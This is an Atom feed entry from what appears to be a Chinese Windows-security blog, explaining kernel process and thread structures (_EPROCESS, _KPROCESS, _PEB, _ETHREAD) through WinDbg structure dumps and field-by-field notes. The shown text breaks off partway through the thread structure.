<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>REOP</title>
  
  
  <link href="http://reop.cc/atom.xml" rel="self"/>
  
  <link href="http://reop.cc/"/>
  <updated>2024-03-28T12:26:56.762Z</updated>
  <id>http://reop.cc/</id>
  
  <author>
    <name>reop</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>进程、线程和APC——Windows安全入门（四）</title>
    <link href="http://reop.cc/Windows/095e8ea6d26d.html"/>
    <id>http://reop.cc/Windows/095e8ea6d26d.html</id>
    <published>2024-03-27T16:00:00.000Z</published>
    <updated>2024-03-28T12:26:56.762Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-进程与线程"><a href="#1-进程与线程" class="headerlink" title="1 进程与线程"></a>1 进程与线程</h2><h3 id="1-1-进程结构体"><a href="#1-1-进程结构体" class="headerlink" title="1.1 进程结构体"></a>1.1 进程结构体</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">kd<span class="token operator">></span> dt _EPROCESSnt<span class="token operator">!</span>_EPROCESS   <span class="token operator">+</span><span class="token number">0x000</span> Pcb              <span class="token operator">:</span> _KPROCESS   <span class="token operator">+</span><span class="token number">0x06c</span> ProcessLock      <span class="token operator">:</span> _EX_PUSH_LOCK   <span class="token operator">+</span><span class="token number">0x070</span> CreateTime       <span class="token operator">:</span> _LARGE_INTEGER   <span class="token operator">+</span><span class="token number">0x078</span> ExitTime         <span class="token operator">:</span> _LARGE_INTEGER   <span class="token operator">+</span><span class="token number">0x080</span> RundownProtect   <span class="token operator">:</span> _EX_RUNDOWN_REF   <span class="token operator">+</span><span class="token number">0x084</span> UniqueProcessId  <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x088</span> ActiveProcessLinks <span class="token operator">:</span> _LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x090</span> QuotaUsage       <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> Uint4B   <span class="token operator">+</span><span class="token number">0x09c</span> QuotaPeak        <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0a8</span> CommitCharge     <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0ac</span> PeakVirtualSize  <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0b0</span> VirtualSize      <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0b4</span> SessionProcessLinks <span class="token operator">:</span> _LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x0bc</span> DebugPort        <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x0c0</span> ExceptionPort    <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x0c4</span> ObjectTable      <span class="token operator">:</span> Ptr32 _HANDLE_TABLE   <span class="token operator">+</span><span class="token number">0x0c8</span> Token            <span class="token operator">:</span> _EX_FAST_REF   <span class="token operator">+</span><span class="token number">0x0cc</span> WorkingSetLock   <span class="token operator">:</span> _FAST_MUTEX   <span class="token operator">+</span><span class="token number">0x0ec</span> WorkingSetPage   <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0f0</span> AddressCreationLock <span class="token operator">:</span> _FAST_MUTEX   <span class="token operator">+</span><span class="token number">0x110</span> HyperSpaceLock   <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x114</span> ForkInProgress   <span class="token operator">:</span> Ptr32 _ETHREAD   <span class="token operator">+</span><span class="token number">0x118</span> HardwareTrigger  <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x11c</span> VadRoot          <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x120</span> VadHint          <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x124</span> CloneRoot        <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x128</span> NumberOfPrivatePages <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x12c</span> NumberOfLockedPages <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x130</span> Win32Process     <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x134</span> Job              <span class="token operator">:</span> Ptr32 _EJOB   <span class="token operator">+</span><span class="token number">0x138</span> SectionObject    <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x13c</span> SectionBaseAddress <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x140</span> QuotaBlock       <span class="token operator">:</span> Ptr32 _EPROCESS_QUOTA_BLOCK   <span class="token operator">+</span><span class="token number">0x144</span> WorkingSetWatch  <span class="token operator">:</span> Ptr32 _PAGEFAULT_HISTORY   <span class="token operator">+</span><span class="token number">0x148</span> Win32WindowStation <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x14c</span> InheritedFromUniqueProcessId <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x150</span> LdtInformation   <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x154</span> VadFreeHint      <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x158</span> VdmObjects       <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x15c</span> DeviceMap        <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x160</span> PhysicalVadList  <span class="token operator">:</span> _LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x168</span> PageDirectoryPte <span class="token operator">:</span> _HARDWARE_PTE   <span class="token operator">+</span><span class="token number">0x168</span> Filler           <span class="token operator">:</span> Uint8B   <span class="token operator">+</span><span class="token number">0x170</span> Session          <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x174</span> ImageFileName    <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> UChar   <span class="token operator">+</span><span class="token number">0x184</span> JobLinks         <span class="token operator">:</span> _LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x18c</span> LockedPagesList  <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x190</span> ThreadListHead   <span class="token operator">:</span> _LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x198</span> SecurityPort     <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x19c</span> PaeTop           <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x1a0</span> ActiveThreads    <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x1a4</span> GrantedAccess    <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x1a8</span> DefaultHardErrorProcessing <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x1ac</span> LastThreadExitStatus <span class="token operator">:</span> Int4B   <span class="token operator">+</span><span class="token number">0x1b0</span> Peb              <span class="token operator">:</span> Ptr32 _PEB   <span class="token operator">+</span><span class="token number">0x1b4</span> PrefetchTrace    <span class="token operator">:</span> _EX_FAST_REF   <span class="token operator">+</span><span class="token number">0x1b8</span> ReadOperationCount <span class="token operator">:</span> _LARGE_INTEGER   <span class="token operator">+</span><span class="token number">0x1c0</span> WriteOperationCount <span class="token operator">:</span> _LARGE_INTEGER   <span class="token operator">+</span><span class="token number">0x1c8</span> OtherOperationCount <span class="token operator">:</span> _LARGE_INTEGER   <span class="token operator">+</span><span class="token number">0x1d0</span> ReadTransferCount <span class="token operator">:</span> _LARGE_INTEGER   <span class="token operator">+</span><span class="token number">0x1d8</span> WriteTransferCount <span class="token operator">:</span> _LARGE_INTEGER   <span class="token operator">+</span><span class="token number">0x1e0</span> OtherTransferCount <span class="token operator">:</span> _LARGE_INTEGER   <span class="token operator">+</span><span class="token number">0x1e8</span> CommitChargeLimit <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x1ec</span> CommitChargePeak <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x1f0</span> AweInfo          <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x1f4</span> SeAuditProcessCreationInfo <span class="token operator">:</span> _SE_AUDIT_PROCESS_CREATION_INFO   <span class="token operator">+</span><span class="token number">0x1f8</span> Vm               <span class="token operator">:</span> _MMSUPPORT   <span class="token operator">+</span><span class="token number">0x238</span> LastFaultCount   <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x23c</span> ModifiedPageCount <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x240</span> NumberOfVads     <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x244</span> JobStatus        <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x248</span> Flags            <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x248</span> CreateReported   <span class="token operator">:</span> Pos <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> NoDebugInherit   <span class="token operator">:</span> Pos <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> ProcessExiting   <span class="token operator">:</span> Pos <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> ProcessDelete    <span class="token operator">:</span> Pos <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> Wow64SplitPages  <span class="token operator">:</span> Pos <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> VmDeleted        <span class="token operator">:</span> Pos <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> OutswapEnabled   <span class="token operator">:</span> Pos <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> Outswapped       <span class="token operator">:</span> Pos <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> ForkFailed       <span class="token operator">:</span> Pos <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> HasPhysicalVad   <span class="token operator">:</span> Pos <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> AddressSpaceInitialized <span class="token operator">:</span> Pos <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">2</span> Bits   <span class="token operator">+</span><span class="token number">0x248</span> SetTimerResolution <span class="token operator">:</span> Pos <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> BreakOnTermination <span class="token operator">:</span> Pos <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> SessionCreationUnderway <span class="token operator">:</span> Pos <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> WriteWatch       <span class="token operator">:</span> Pos <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> ProcessInSession <span class="token operator">:</span> Pos <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> OverrideAddressSpace <span class="token operator">:</span> Pos <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> HasAddressSpace  <span class="token operator">:</span> Pos <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> LaunchPrefetched <span class="token operator">:</span> Pos <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> InjectInpageErrors <span class="token operator">:</span> Pos <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> VmTopDown        <span class="token operator">:</span> Pos <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> Unused3          <span class="token operator">:</span> Pos <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> Unused4          <span class="token operator">:</span> Pos <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> VdmAllowed       <span class="token operator">:</span> Pos <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> Unused           <span class="token operator">:</span> Pos <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">5</span> Bits   <span class="token operator">+</span><span class="token number">0x248</span> Unused1          <span class="token operator">:</span> Pos <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> Unused2          <span class="token operator">:</span> Pos <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x24c</span> ExitStatus       <span class="token operator">:</span> Int4B   <span class="token operator">+</span><span class="token number">0x250</span> NextPageColor    <span class="token operator">:</span> Uint2B   <span class="token operator">+</span><span class="token number">0x252</span> SubSystemMinorVersion <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x253</span> SubSystemMajorVersion <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x252</span> SubSystemVersion <span class="token operator">:</span> Uint2B   <span class="token operator">+</span><span class="token number">0x254</span> PriorityClass    <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x255</span> WorkingSetAcquiredUnsafe <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x258</span> Cookie           <span class="token operator">:</span> Uint4B<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>CreateTime：进程创建时间；</li><li>ExitTime：进程退出时间；</li><li>UniqueProcessId：PID；</li><li>AtiveProcessLinks：存储所有进程的双向链表；</li><li>QuotaUsage、QuotaPeak：物理页相关信息；</li><li>CommitCharge、PeakVirtualSize、VirtualSize：虚拟内存相关信息；</li><li>ObjectTable：句柄表；</li><li>VadRoot：标记已被使用的低2G虚拟地址；</li><li>ImageFileName：进程对应的镜像文件名；</li><li>ActiveThreads：活动线程数；</li><li><em><strong>PCB</strong></em>：进程控制块；</li><li><em><strong>PEB</strong></em>：进程环境块；</li></ul><h4 id="PCB"><a href="#PCB" class="headerlink" title="PCB"></a>PCB</h4><p>存储进程的控制信息：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">kd<span class="token operator">></span> dt _KPROCESSnt<span class="token operator">!</span>_KPROCESS   <span class="token operator">+</span><span class="token number">0x000</span> Header           <span class="token operator">:</span> _DISPATCHER_HEADER   <span class="token operator">+</span><span class="token number">0x010</span> ProfileListHead  <span class="token operator">:</span> _LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x018</span> DirectoryTableBase <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> Uint4B   <span class="token operator">+</span><span class="token number">0x020</span> LdtDescriptor    <span class="token operator">:</span> _KGDTENTRY   <span class="token operator">+</span><span class="token number">0x028</span> Int21Descriptor  <span class="token operator">:</span> _KIDTENTRY   <span class="token operator">+</span><span class="token number">0x030</span> IopmOffset       <span class="token operator">:</span> Uint2B   <span class="token operator">+</span><span class="token number">0x032</span> Iopl             <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x033</span> Unused           <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x034</span> ActiveProcessors <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x038</span> KernelTime       <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x03c</span> UserTime         <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x040</span> ReadyListHead    <span class="token operator">:</span> _LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x048</span> SwapListEntry    <span class="token operator">:</span> _SINGLE_LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x04c</span> VdmTrapcHandler  <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x050</span> ThreadListHead   <span class="token operator">:</span> _LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x058</span> ProcessLock      <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x05c</span> Affinity         <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x060</span> StackCount       <span class="token operator">:</span> Uint2B   <span class="token operator">+</span><span class="token number">0x062</span> BasePriority     <span class="token operator">:</span> Char   <span class="token operator">+</span><span class="token number">0x063</span> ThreadQuantum    <span class="token operator">:</span> Char   <span class="token operator">+</span><span class="token number">0x064</span> AutoAlignment    <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x065</span> State            <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x066</span> ThreadSeed       <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x067</span> DisableBoost     <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x068</span> PowerState       <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x069</span> DisableQuantum   <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x06a</span> IdealNode        <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x06b</span> Flags            <span class="token operator">:</span> _KEXECUTE_OPTIONS   <span class="token operator">+</span><span class="token number">0x06b</span> ExecuteOptions   <span class="token operator">:</span> UChar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>Header：头部标识，用于3环API的调用；</li><li>DirectoryTableBase：保存当前进程的CR3值；</li><li>KernelTime：进程在0环运行的时间；</li><li>UserTime：进程在3环运行的时间；</li><li>Affinity：多核调用相关；</li><li>BasePriority：改进程中所有线程中的最低优先级；</li></ul><h4 id="PEB"><a href="#PEB" class="headerlink" title="PEB"></a>PEB</h4><p>存储进程运行时的环境信息：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">kd<span class="token operator">></span> dt _PEBnt<span class="token operator">!</span>_PEB   <span class="token operator">+</span><span class="token number">0x000</span> InheritedAddressSpace <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x001</span> ReadImageFileExecOptions <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x002</span> BeingDebugged    <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x003</span> SpareBool        <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x004</span> Mutant           <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x008</span> ImageBaseAddress <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x00c</span> Ldr              <span class="token operator">:</span> Ptr32 _PEB_LDR_DATA   <span class="token operator">+</span><span class="token number">0x010</span> ProcessParameters <span class="token operator">:</span> Ptr32 _RTL_USER_PROCESS_PARAMETERS   <span class="token operator">+</span><span class="token number">0x014</span> SubSystemData    <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x018</span> ProcessHeap      <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x01c</span> FastPebLock      <span class="token operator">:</span> Ptr32 _RTL_CRITICAL_SECTION   <span class="token operator">+</span><span class="token number">0x020</span> FastPebLockRoutine <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x024</span> FastPebUnlockRoutine <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x028</span> EnvironmentUpdateCount <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x02c</span> KernelCallbackTable <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x030</span> SystemReserved   <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> Uint4B   <span class="token operator">+</span><span class="token number">0x034</span> AtlThunkSListPtr32 <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x038</span> FreeList         <span class="token operator">:</span> Ptr32 _PEB_FREE_BLOCK   <span class="token operator">+</span><span class="token number">0x03c</span> TlsExpansionCounter <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x040</span> TlsBitmap        <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x044</span> TlsBitmapBits    <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> Uint4B   <span class="token operator">+</span><span class="token number">0x04c</span> ReadOnlySharedMemoryBase <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x050</span> ReadOnlySharedMemoryHeap <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x054</span> ReadOnlyStaticServerData <span class="token operator">:</span> Ptr32 Ptr32 Void   <span class="token operator">+</span><span class="token number">0x058</span> AnsiCodePageData <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x05c</span> OemCodePageData  <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x060</span> UnicodeCaseTableData <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x064</span> NumberOfProcessors <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x068</span> NtGlobalFlag     <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x070</span> CriticalSectionTimeout <span class="token operator">:</span> _LARGE_INTEGER   <span class="token operator">+</span><span class="token number">0x078</span> HeapSegmentReserve <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x07c</span> HeapSegmentCommit <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x080</span> HeapDeCommitTotalFreeThreshold <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x084</span> HeapDeCommitFreeBlockThreshold <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x088</span> NumberOfHeaps    <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x08c</span> MaximumNumberOfHeaps <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x090</span> ProcessHeaps     <span class="token operator">:</span> Ptr32 Ptr32 Void   <span class="token operator">+</span><span class="token number">0x094</span> GdiSharedHandleTable <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x098</span> ProcessStarterHelper <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x09c</span> GdiDCAttributeList <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0a0</span> LoaderLock       <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x0a4</span> OSMajorVersion   <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0a8</span> OSMinorVersion   <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0ac</span> OSBuildNumber    <span class="token operator">:</span> Uint2B   <span class="token operator">+</span><span class="token number">0x0ae</span> OSCSDVersion     <span class="token operator">:</span> Uint2B   <span class="token operator">+</span><span class="token number">0x0b0</span> OSPlatformId     <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0b4</span> ImageSubsystem   <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0b8</span> ImageSubsystemMajorVersion <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0bc</span> ImageSubsystemMinorVersion <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0c0</span> ImageProcessAffinityMask <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0c4</span> GdiHandleBuffer  <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span> Uint4B   <span class="token operator">+</span><span class="token number">0x14c</span> PostProcessInitRoutine <span class="token operator">:</span> Ptr32     <span class="token keyword">void</span>    <span class="token operator">+</span><span class="token number">0x150</span> TlsExpansionBitmap <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x154</span> TlsExpansionBitmapBits <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> Uint4B   <span class="token operator">+</span><span class="token number">0x1d4</span> SessionId        <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x1d8</span> AppCompatFlags   <span class="token operator">:</span> _ULARGE_INTEGER   <span class="token operator">+</span><span class="token number">0x1e0</span> AppCompatFlagsUser <span class="token operator">:</span> _ULARGE_INTEGER   <span class="token operator">+</span><span class="token number">0x1e8</span> pShimData        <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x1ec</span> AppCompatInfo    <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x1f0</span> CSDVersion       <span class="token operator">:</span> _UNICODE_STRING   <span class="token operator">+</span><span class="token number">0x1f8</span> ActivationContextData <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x1fc</span> ProcessAssemblyStorageMap <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x200</span> SystemDefaultActivationContextData <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x204</span> SystemAssemblyStorageMap <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x208</span> MinimumStackCommit <span class="token operator">:</span> Uint4B<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-2-线程结构体"><a href="#1-2-线程结构体" class="headerlink" title="1.2 线程结构体"></a>1.2 线程结构体</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">kd<span class="token operator">></span> dt _ETHREADnt<span class="token operator">!</span>_ETHREAD   <span class="token operator">+</span><span class="token number">0x000</span> Tcb              <span class="token operator">:</span> _KTHREAD   <span class="token operator">+</span><span class="token number">0x1c0</span> CreateTime       <span class="token operator">:</span> _LARGE_INTEGER   <span class="token operator">+</span><span class="token number">0x1c0</span> NestedFaultCount <span class="token operator">:</span> Pos <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span> Bits   <span class="token operator">+</span><span class="token number">0x1c0</span> ApcNeeded        <span class="token operator">:</span> Pos <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x1c8</span> ExitTime         <span class="token operator">:</span> _LARGE_INTEGER   <span class="token operator">+</span><span class="token number">0x1c8</span> LpcReplyChain    <span class="token operator">:</span> _LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x1c8</span> KeyedWaitChain   <span class="token operator">:</span> _LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x1d0</span> ExitStatus       <span class="token operator">:</span> Int4B   <span class="token operator">+</span><span class="token number">0x1d0</span> OfsChain         <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x1d4</span> PostBlockList    <span class="token operator">:</span> _LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x1dc</span> TerminationPort  <span class="token operator">:</span> Ptr32 _TERMINATION_PORT   <span class="token operator">+</span><span class="token number">0x1dc</span> ReaperLink       <span class="token operator">:</span> 